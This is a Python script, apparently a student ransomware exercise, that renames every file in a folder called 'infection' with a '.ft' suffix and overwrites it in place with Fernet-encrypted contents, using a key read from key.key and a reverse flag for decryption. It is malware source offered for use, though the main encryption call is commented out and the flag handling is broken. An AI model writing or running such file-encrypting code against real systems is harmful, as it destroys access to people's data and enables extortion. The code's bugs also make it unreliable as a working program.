#!/Volumes/sgoinfre/students/iostancu/homebrew/bin/python3
import argparse
from os import listdir, rename
from os.path import split
from cryptography.fernet import Fernet

def load_key():

    return open("key.key", "rb").read()

def encrypt_file(dst, k):

    with open(dst, 'rb') as o_file:
        r_file = o_file.read()
    crypt = k.encrypt(r_file)
    with open(dst, 'wb') as crypt_file:
        crypt_file.write(crypt)
    print("encrypted file")

def decrypt_file(dst, k):

    with open(dst, 'rb') as o_file:
        r_file = o_file.read()
    decrypt = k.decrypt(r_file)
    with open(dst, 'wb') as crypt_file:
        crypt_file.write(decrypt)
    print("encrypted file")

def files_treat():
    
    folder = "infection"
    with open("key.key", "rb") as mykey:
            key = mykey.read()
    k = Fernet(key)
    
    for count, filename in enumerate(listdir(folder)):
        modified_file = False
        src = folder + '/' + filename
        print(filename, src)
        if not filename.endswith('.ft'):
            modified_file = True
            newname = filename + '.ft'
            dst = folder + '/' + newname
            rename(src, dst)
        if modified_file == True:
            newfile = split(dst)
            if newfile[1].endswith('.ft'):
                encrypt_file(dst, k)
        else:
            newfile = split(src)
            if newfile[1].endswith('.ft'):
                encrypt_file(src, k)

def main():

    parser = argparse.ArgumentParser()
    parser.add_argument("-help", "-hp", help="Shows list of avaible flags", 
        action="store_true")
    parser.add_argument("-version", "-v", help="To see the program version", 
        action="store_true")
    parser.add_argument("-silent", "-s", help="Silent encription files traces", 
        action="store_true")
    parser.add_argument("-reverse", "-r", type=str,
        help="Use this flag + [encryption key] to reverse encryption")
    args = parser.parse_args()
    if args.help:
        print("ok")
    elif args.version:
        print("ok")
    if args.reverse == 1:
        print("yes key!")
    else:
        print("-reverse + [key]")


#   !!!! https://docs.python.org/3/library/argparse.html !!!!
#    if else:
#        files_treat()

if __name__ == '__main__':
    main()
